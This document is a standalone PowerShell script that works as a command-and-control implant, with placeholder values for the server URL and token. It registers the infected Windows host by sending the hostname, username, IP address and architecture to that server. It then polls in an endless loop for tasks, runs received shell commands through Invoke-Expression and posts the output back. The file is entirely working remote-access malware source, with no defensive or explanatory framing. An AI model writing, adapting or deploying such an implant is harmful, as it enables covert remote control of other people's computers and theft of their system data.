$C2Url = "__C2_URL__"
$C2Token = "__C2_TOKEN__"
$AidFile = "$env:TEMP\.agent_id"
$Interval = 10

function Get-AgentId {
    if (Test-Path $AidFile) {
        return Get-Content $AidFile -Raw | ForEach-Object { $_.Trim() }
    }
    $id = [System.Guid]::NewGuid().ToString().Substring(0, 8)
    Set-Content -Path $AidFile -Value $id
    return $id
}

function Invoke-Request {
    param($Path, $Data)
    try {
        $url = "$C2Url$Path"
        if ($Data) {
            $body = $Data | ConvertTo-Json
            $r = Invoke-WebRequest -Uri $url -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
        } else {
            $sep = if ($Path.Contains('?')) { '&' } else { '?' }
            $r = Invoke-WebRequest -Uri ($url + $sep + 'token=' + $C2Token) -UseBasicParsing
        }
        return $r.Content | ConvertFrom-Json
    } catch { return $null }
}

$aid = Get-AgentId
while ($true) {
    if (-not (Test-Path $AidFile)) {
        $info = @{hostname=$env:COMPUTERNAME; username=$env:USERNAME; os="Windows"; ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -ne "Loopback"} | Select-Object -First 1).IPAddress; arch=$env:PROCESSOR_ARCHITECTURE; token=$C2Token}
        $res = Invoke-Request -Path "/register" -Data $info
        if ($res.agent_id) {
            Set-Content -Path $AidFile -Value $res.agent_id
            $aid = $res.agent_id
        }
    }
    $tasks = Invoke-Request -Path "/tasks/$aid"
    if ($tasks.tasks) {
        foreach ($t in $tasks.tasks) {
            if ($t.command -eq "shell") {
                try {
                    $out = Invoke-Expression $t.params.command 2>&1 | Out-String
                } catch { $out = "[!] Error" }
                Invoke-Request -Path "/result/$aid" -Data @{task_id=$t.task_id; output=$out; status="success"}
            }
        }
    }
    Start-Sleep -Seconds $Interval
}
